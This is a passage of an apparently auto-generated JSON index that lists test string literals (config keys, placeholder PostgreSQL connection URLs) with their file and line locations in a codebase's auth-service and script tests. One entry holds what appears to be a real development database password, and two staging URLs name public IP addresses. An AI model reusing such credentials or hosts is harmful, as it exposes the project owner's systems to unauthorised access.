    },
    "paths": {
      "value": "paths",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:54",
        "scripts/test_backend_optimized.py:60",
        "scripts/test_backend_optimized.py:66",
        "scripts/test_backend_optimized.py:72",
        "scripts/test_backend_optimized.py:78",
        "scripts/test_backend_optimized.py:84",
        "scripts/test_backend_optimized.py:94",
        "scripts/test_backend_optimized.py:300"
      ]
    },
    "pattern": {
      "value": "pattern",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:87",
        "netra_backend/app/services/realistic_test_data/models.py:92",
        "netra_backend/app/services/realistic_test_data/models.py:97",
        "netra_backend/app/services/realistic_test_data/models.py:102",
        "netra_backend/app/services/realistic_test_data/models.py:147",
        "scripts/batch_fix_and_test.py:23",
        "scripts/batch_fix_and_test.py:29",
        "scripts/batch_fix_and_test.py:35",
        "scripts/batch_fix_and_test.py:51",
        "scripts/batch_fix_and_test.py:52"
      ]
    },
    "payload": {
      "value": "payload",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:285",
        "scripts/test_cold_start_e2e.py:392",
        "scripts/test_cold_start_e2e.py:415"
      ]
    },
    "peak_hours": {
      "value": "peak_hours",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:31",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:37",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:43",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:113"
      ]
    },
    "peak_multiplier": {
      "value": "peak_multiplier",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:31",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:37",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:43",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:114"
      ]
    },
    "peak_rps": {
      "value": "peak_rps",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72"
      ]
    },
    "pending": {
      "value": "pending",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:263"
      ]
    },
    "percent_covered": {
      "value": "percent_covered",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:123",
        "scripts/test_backend.py:411"
      ]
    },
    "percentage": {
      "value": "percentage",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:202"
      ]
    },
    "perf": {
      "value": "perf",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:491"
      ]
    },
    "performance": {
      "value": "performance",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:348",
        "scripts/auto_fix_test_sizes.py:349",
        "scripts/auto_fix_test_violations.py:491",
        "scripts/auto_fix_test_violations.py:492",
        "scripts/autonomous_review/test_reviewer.py:216",
        "scripts/autonomous_review/test_reviewer.py:229",
        "scripts/autonomous_review/test_reviewer.py:230",
        "scripts/business_value_test_index.py:88",
        "scripts/business_value_test_index.py:423",
        "scripts/business_value_test_index.py:463"
      ]
    },
    "performance_analysis": {
      "value": "performance_analysis",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:217"
      ]
    },
    "performance_data": {
      "value": "performance_data",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72"
      ]
    },
    "performance_degradation": {
      "value": "performance_degradation",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:162",
        "netra_backend/app/services/realistic_test_data/models.py:97"
      ]
    },
    "performance_grade": {
      "value": "performance_grade",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:214",
        "scripts/test_backend_optimized.py:214",
        "scripts/test_backend_optimized.py:272",
        "scripts/test_backend_optimized.py:331"
      ]
    },
    "performance_metrics": {
      "value": "performance_metrics",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:14"
      ]
    },
    "performance_scores": {
      "value": "performance_scores",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:263",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:275"
      ]
    },
    "permission": {
      "value": "permission",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:212",
        "scripts/analyze_test_mocks.py:44"
      ]
    },
    "permission_granted": {
      "value": "permission_granted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:31"
      ]
    },
    "permission_id": {
      "value": "permission_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:57",
        "auth_service/tests/factories/permission_factory.py:198",
        "auth_service/tests/factories/permission_factory.py:216"
      ]
    },
    "permission_revoked": {
      "value": "permission_revoked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:32"
      ]
    },
    "permissions": {
      "value": "permissions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:141",
        "auth_service/tests/factories/token_factory.py:39",
        "auth_service/tests/factories/token_factory.py:265",
        "auth_service/tests/test_auth_token_generation.py:68",
        "auth_service/tests/test_auth_token_generation.py:84",
        "auth_service/tests/test_auth_token_generation.py:119",
        "auth_service/tests/test_auth_token_generation.py:169",
        "auth_service/tests/test_auth_token_security.py:55",
        "auth_service/tests/test_auth_token_security.py:91",
        "auth_service/tests/test_auth_token_security.py:92"
      ]
    },
    "picture": {
      "value": "picture",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:87",
        "auth_service/tests/integration/test_auth_oauth_google.py:49",
        "auth_service/tests/integration/test_auth_oauth_google.py:250",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:123",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1279",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:85"
      ]
    },
    "pid": {
      "value": "pid",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:211",
        "auth_service/tests/auth-service-down-critical-scenarios.py:215",
        "auth_service/tests/auth-service-down-critical-scenarios.py:233",
        "auth_service/tests/auth-service-down-critical-scenarios.py:237",
        "auth_service/tests/auth-service-down-critical-scenarios.py:499",
        "auth_service/tests/auth-service-down-critical-scenarios.py:503",
        "auth_service/tests/auth-service-down-critical-scenarios.py:513",
        "auth_service/tests/auth-service-down-critical-scenarios.py:534",
        "auth_service/tests/auth-service-down-critical-scenarios.py:538",
        "scripts/cleanup_test_processes.py:61"
      ]
    },
    "ping": {
      "value": "ping",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:85",
        "scripts/test_websocket_dev_mode.py:194",
        "scripts/test_websocket_simple.py:23"
      ]
    },
    "pkce": {
      "value": "pkce",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:203"
      ]
    },
    "placeholder": {
      "value": "placeholder",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:408"
      ]
    },
    "placeholder password": {
      "value": "placeholder password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:127"
      ]
    },
    "pong": {
      "value": "pong",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:205"
      ]
    },
    "pool disposal failed": {
      "value": "pool disposal failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:154"
      ]
    },
    "pool:test:": {
      "value": "pool:test:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:205"
      ]
    },
    "pool_size": {
      "value": "pool_size",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:179",
        "auth_service/tests/test_database_manager.py:256"
      ]
    },
    "poolclass": {
      "value": "poolclass",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:197"
      ]
    },
    "poor": {
      "value": "poor",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:47"
      ]
    },
    "port": {
      "value": "port",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:56",
        "auth_service/test_staging_db_connection.py:93",
        "scripts/test_coordination_fixes.py:310",
        "scripts/test_coordination_fixes.py:322"
      ]
    },
    "port_allocation": {
      "value": "port_allocation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:44"
      ]
    },
    "port_allocation           → test_08_port_binding_race_conditions": {
      "value": "port_allocation           → test_08_port_binding_race_conditions",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:394"
      ]
    },
    "post-deploy-error": {
      "value": "post-deploy-error",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:133"
      ]
    },
    "post-deploy-warning": {
      "value": "post-deploy-warning",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:123"
      ]
    },
    "postgres": {
      "value": "postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:36",
        "auth_service/test_actual_staging_credentials.py:37",
        "auth_service/test_staging_db_connection.py:42",
        "auth_service/test_staging_db_connection.py:58",
        "auth_service/test_staging_db_connection.py:95",
        "auth_service/test_url_construction.py:38",
        "auth_service/test_url_construction.py:175",
        "auth_service/tests/config/test_env.py:216",
        "auth_service/tests/database/test_config.py:107",
        "auth_service/tests/database/test_config.py:108"
      ]
    },
    "postgres-db-staging": {
      "value": "postgres-db-staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:227",
        "scripts/test_ssl_certificates_staging.py:210",
        "scripts/test_staging_db_direct.py:40",
        "scripts/test_staging_migrations.py:39",
        "scripts/test_staging_migrations.py:227"
      ]
    },
    "postgres-host-staging": {
      "value": "postgres-host-staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:225",
        "scripts/test_ssl_certificates_staging.py:36",
        "scripts/test_ssl_certificates_staging.py:208",
        "scripts/test_staging_db_direct.py:38",
        "scripts/test_staging_migrations.py:37",
        "scripts/test_staging_migrations.py:225"
      ]
    },
    "postgres-password-staging": {
      "value": "postgres-password-staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:229",
        "scripts/test_ssl_certificates_staging.py:212",
        "scripts/test_staging_db_direct.py:42",
        "scripts/test_staging_migrations.py:41",
        "scripts/test_staging_migrations.py:229"
      ]
    },
    "postgres-port-staging": {
      "value": "postgres-port-staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:226",
        "scripts/test_ssl_certificates_staging.py:37",
        "scripts/test_ssl_certificates_staging.py:209",
        "scripts/test_staging_db_direct.py:39",
        "scripts/test_staging_migrations.py:38",
        "scripts/test_staging_migrations.py:226"
      ]
    },
    "postgres-user-staging": {
      "value": "postgres-user-staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:228",
        "scripts/test_ssl_certificates_staging.py:211",
        "scripts/test_staging_db_direct.py:41",
        "scripts/test_staging_migrations.py:40",
        "scripts/test_staging_migrations.py:228"
      ]
    },
    "postgres:": {
      "value": "postgres:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:73"
      ]
    },
    "postgres://": {
      "value": "postgres://",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:315"
      ]
    },
    "postgres://netra_user:password@/postgres?host=/cloudsql/instance&sslmode=require": {
      "value": "postgres://netra_user:password@/postgres?host=/cloudsql/instance&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:299"
      ]
    },
    "postgres://user:pass@/db?host=/cloudsql/instance&sslmode=prefer": {
      "value": "postgres://user:pass@/db?host=/cloudsql/instance&sslmode=prefer",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:75"
      ]
    },
    "postgres://user:pass@host.com:5432/dbname": {
      "value": "postgres://user:pass@host.com:5432/dbname",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:99"
      ]
    },
    "postgres://user:pass@host:5432/db": {
      "value": "postgres://user:pass@host:5432/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:38",
        "auth_service/tests/test_postgres_compliance.py:53"
      ]
    },
    "postgres://user:pass@localhost/db": {
      "value": "postgres://user:pass@localhost/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:32"
      ]
    },
    "postgres:15": {
      "value": "postgres:15",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:65"
      ]
    },
    "postgres_DB": {
      "value": "postgres_DB",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:369"
      ]
    },
    "postgres_db": {
      "value": "postgres_db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:365"
      ]
    },
    "postgresql": {
      "value": "postgresql",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:115",
        "scripts/test_backend.py:145"
      ]
    },
    "postgresql+asyncpg://": {
      "value": "postgresql+asyncpg://",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:70",
        "auth_service/test_staging_db_connection.py:200",
        "auth_service/test_staging_db_connection.py:202",
        "auth_service/test_url_construction.py:104",
        "auth_service/test_url_construction.py:141",
        "auth_service/tests/database/test_config.py:110",
        "auth_service/tests/database/test_config.py:122",
        "auth_service/tests/database/test_config.py:147",
        "auth_service/tests/test_auth_database_manager_missing_method.py:49",
        "auth_service/tests/test_auth_database_manager_missing_method.py:85"
      ]
    },
    "postgresql+asyncpg://fake_user:fake_password@localhost:5432/fake_db": {
      "value": "postgresql+asyncpg://fake_user:fake_password@localhost:5432/fake_db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:235"
      ]
    },
    "postgresql+asyncpg://invalid:creds@localhost:5432/test": {
      "value": "postgresql+asyncpg://invalid:creds@localhost:5432/test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:55"
      ]
    },
    "postgresql+asyncpg://invalid:wrong@localhost:5432/test": {
      "value": "postgresql+asyncpg://invalid:wrong@localhost:5432/test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:167"
      ]
    },
    "postgresql+asyncpg://invalid_user:wrong_password@localhost:5432/nonexistent_db": {
      "value": "postgresql+asyncpg://invalid_user:wrong_password@localhost:5432/nonexistent_db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:117"
      ]
    },
    "postgresql+asyncpg://netra_staging:password@35.223.209.195:5432/netra_staging": {
      "value": "postgresql+asyncpg://netra_staging:password@35.223.209.195:5432/netra_staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:214"
      ]
    },
    "postgresql+asyncpg://netra_user:password@/postgres?host=/cloudsql/instance": {
      "value": "postgresql+asyncpg://netra_user:password@/postgres?host=/cloudsql/instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:302"
      ]
    },
    "postgresql+asyncpg://postgres:": {
      "value": "postgresql+asyncpg://postgres:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:148"
      ]
    },
    "postgresql+asyncpg://postgres:DTprdt5KoQXlEG4Gh9lF@localhost:5433/netra_dev": {
      "value": "postgresql+asyncpg://postgres:DTprdt5KoQXlEG4Gh9lF@localhost:5433/netra_dev",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:18"
      ]
    },
    "postgresql+asyncpg://postgres:password@localhost:5432/auth": {
      "value": "postgresql+asyncpg://postgres:password@localhost:5432/auth",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:213"
      ]
    },
    "postgresql+asyncpg://postgres:postgres@localhost:5432/test_auth_service": {
      "value": "postgresql+asyncpg://postgres:postgres@localhost:5432/test_auth_service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:193"
      ]
    },
    "postgresql+asyncpg://postgres:test_staging_password@/test_db?host=/cloudsql/test:region:instance": {
      "value": "postgresql+asyncpg://postgres:test_staging_password@/test_db?host=/cloudsql/test:region:instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:425"
      ]
    },
    "postgresql+asyncpg://postgres:wrong@localhost:5432/test": {
      "value": "postgresql+asyncpg://postgres:wrong@localhost:5432/test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:158",
        "auth_service/tests/test_database_authentication_failures.py:268",
        "auth_service/tests/test_database_connection_validation.py:92",
        "auth_service/tests/test_database_connection_validation.py:279"
      ]
    },
    "postgresql+asyncpg://test:test@localhost:5432/test": {
      "value": "postgresql+asyncpg://test:test@localhost:5432/test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:383"
      ]
    },
    "postgresql+asyncpg://test:test@localhost:5432/test_db": {
      "value": "postgresql+asyncpg://test:test@localhost:5432/test_db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:109"
      ]
    },
    "postgresql+asyncpg://user:pass@/db?host=/cloudsql/project:region:instance&sslmode=require": {
      "value": "postgresql+asyncpg://user:pass@/db?host=/cloudsql/project:region:instance&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:71",
        "auth_service/tests/test_postgres_compliance.py:82"
      ]
    },
    "postgresql+asyncpg://user:pass@host:5432/db": {
      "value": "postgresql+asyncpg://user:pass@host:5432/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:37",
        "auth_service/tests/test_postgres_compliance.py:38",
        "auth_service/tests/test_postgres_compliance.py:39",
        "auth_service/tests/test_postgres_compliance.py:40",
        "auth_service/tests/test_postgres_compliance.py:41",
        "auth_service/tests/test_postgres_compliance.py:41",
        "auth_service/tests/test_postgres_compliance.py:52",
        "auth_service/tests/test_postgres_compliance.py:80",
        "auth_service/tests/test_postgres_compliance.py:110"
      ]
    },
    "postgresql+asyncpg://user:pass@host:5432/db?ssl=require": {
      "value": "postgresql+asyncpg://user:pass@host:5432/db?ssl=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:81"
      ]
    },
    "postgresql+asyncpg://user:pass@host:5432/db?sslmode=require": {
      "value": "postgresql+asyncpg://user:pass@host:5432/db?sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:65",
        "auth_service/tests/test_postgres_compliance.py:91"
      ]
    },
    "postgresql+asyncpg://user:pass@localhost/db": {
      "value": "postgresql+asyncpg://user:pass@localhost/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:25",
        "auth_service/tests/test_database_manager.py:95",
        "auth_service/tests/test_database_manager.py:127"
      ]
    },
    "postgresql+asyncpg://user:pass@localhost/db?sslmode=require": {
      "value": "postgresql+asyncpg://user:pass@localhost/db?sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:143"
      ]
    },
    "postgresql+asyncpg://user:pass@localhost:5432/db": {
      "value": "postgresql+asyncpg://user:pass@localhost:5432/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:86",
        "scripts/test_auth_database_sessions.py:192"
      ]
    },
    "postgresql+asyncpg://user_pr-4:password@localhost:5432/netra_auth": {
      "value": "postgresql+asyncpg://user_pr-4:password@localhost:5432/netra_auth",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:237"
      ]
    },
    "postgresql+asyncpg://user_pr-4:wrong_password@/test_db?host=/cloudsql/test:region:instance": {
      "value": "postgresql+asyncpg://user_pr-4:wrong_password@/test_db?host=/cloudsql/test:region:instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:458"
      ]
    },
    "postgresql+psycopg2://": {
      "value": "postgresql+psycopg2://",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:50",
        "auth_service/tests/test_database_manager.py:122",
        "auth_service/tests/test_database_manager.py:225"
      ]
    },
    "postgresql+psycopg2://user:pass@host:5432/db": {
      "value": "postgresql+psycopg2://user:pass@host:5432/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:39",
        "auth_service/tests/test_postgres_compliance.py:52",
        "auth_service/tests/test_postgres_compliance.py:53",
        "auth_service/tests/test_postgres_compliance.py:54",
        "auth_service/tests/test_postgres_compliance.py:92",
        "auth_service/tests/test_postgres_compliance.py:100"
      ]
    },
    "postgresql+psycopg2://user:pass@host:5432/db?sslmode=require": {
      "value": "postgresql+psycopg2://user:pass@host:5432/db?sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:101"
      ]
    },
    "postgresql+psycopg://user:pass@host:5432/db": {
      "value": "postgresql+psycopg://user:pass@host:5432/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:40"
      ]
    },
    "postgresql://": {
      "value": "postgresql://",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:202",
        "auth_service/test_url_construction.py:105",
        "auth_service/tests/test_auth_database_manager_missing_method.py:329",
        "auth_service/tests/test_critical_staging_database_failures.py:350",
        "auth_service/tests/test_database_manager.py:34",
        "auth_service/tests/test_database_manager.py:210",
        "scripts/test_auth_database_sessions.py:92",
        "scripts/test_auth_database_sessions.py:250"
      ]
    },
    "postgresql://health_user:health_password@localhost:5432/test": {
      "value": "postgresql://health_user:health_password@localhost:5432/test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:123"
      ]
    },
    "postgresql://main_user:main_password@localhost:5432/test": {
      "value": "postgresql://main_user:main_password@localhost:5432/test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:117"
      ]
    },
    "postgresql://netra_test:test_password@localhost:5433/netra_test": {
      "value": "postgresql://netra_test:test_password@localhost:5433/netra_test",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:156"
      ]
    },
    "postgresql://netra_user:$(STAGING_DB_PASSWORD)@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require": {
      "value": "postgresql://netra_user:$(STAGING_DB_PASSWORD)@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:154"
      ]
    },
    "postgresql://netra_user:secret_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require": {
      "value": "postgresql://netra_user:secret_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:233"
      ]
    },
    "postgresql://netra_user:staging_pass@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require": {
      "value": "postgresql://netra_user:staging_pass@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:271"
      ]
    },
    "postgresql://netra_user:staging_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require": {
      "value": "postgresql://netra_user:staging_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:45"
      ]
    },
    "postgresql://postgres:123@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://postgres:123@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:126",
        "auth_service/tests/test_staging_database_credentials.py:374"
      ]
    },
    "postgresql://postgres:@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://postgres:@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:124"
      ]
    },
    "postgresql://postgres:correct_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://postgres:correct_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:46"
      ]
    },
    "postgresql://postgres:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://postgres:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:125"
      ]
    },
    "postgresql://postgres:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres&sslmode=require": {
      "value": "postgresql://postgres:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:268"
      ]
    },
    "postgresql://postgres:password@/netra_staging?host=/cloudsql/wrong-project:region:instance": {
      "value": "postgresql://postgres:password@/netra_staging?host=/cloudsql/wrong-project:region:instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:262"
      ]
    },
    "postgresql://postgres:password@34.132.142.103:5432/netra_staging": {
      "value": "postgresql://postgres:password@34.132.142.103:5432/netra_staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:259"
      ]
    },
    "postgresql://postgres:password@localhost:5432/netra_staging": {
      "value": "postgresql://postgres:password@localhost:5432/netra_staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:256",
        "auth_service/tests/test_staging_database_credentials.py:366"
      ]
    },
    "postgresql://postgres:password@localhost:5432/testdb": {
      "value": "postgresql://postgres:password@localhost:5432/testdb",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:120"
      ]
    },
    "postgresql://postgres:secure_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://postgres:secure_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:217"
      ]
    },
    "postgresql://postgres:secure_password_123@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://postgres:secure_password_123@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:350"
      ]
    },
    "postgresql://postgres:secure_staging_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://postgres:secure_staging_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:309"
      ]
    },
    "postgresql://postgres:wrong_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://postgres:wrong_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:127"
      ]
    },
    "postgresql://postgres:wrong_password@cloudsql/auth_db": {
      "value": "postgresql://postgres:wrong_password@cloudsql/auth_db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:29"
      ]
    },
    "postgresql://test:test@localhost:5432/netra_test": {
      "value": "postgresql://test:test@localhost:5432/netra_test",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:79"
      ]
    },
    "postgresql://test:test@localhost:5432/test_db": {
      "value": "postgresql://test:test@localhost:5432/test_db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:100"
      ]
    },
    "postgresql://user:pass@/db?host=/cloudsql/instance&ssl=require": {
      "value": "postgresql://user:pass@/db?host=/cloudsql/instance&ssl=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:73"
      ]
    },
    "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=disable": {
      "value": "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=disable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:74"
      ]
    },
    "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=require": {
      "value": "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:72",
        "auth_service/tests/test_staging_auth_ssl_failures.py:133",
        "auth_service/tests/test_staging_auth_ssl_failures.py:205"
      ]
    },
    "postgresql://user:pass@/db?host=/cloudsql/project:region:instance": {
      "value": "postgresql://user:pass@/db?host=/cloudsql/project:region:instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:155",
        "scripts/test_auth_database_sessions.py:80"
      ]
    },
    "postgresql://user:pass@/db?host=/cloudsql/project:region:instance&sslmode=require": {
      "value": "postgresql://user:pass@/db?host=/cloudsql/project:region:instance&sslmode=require",
      "category": "test_literals",
      "locations": [
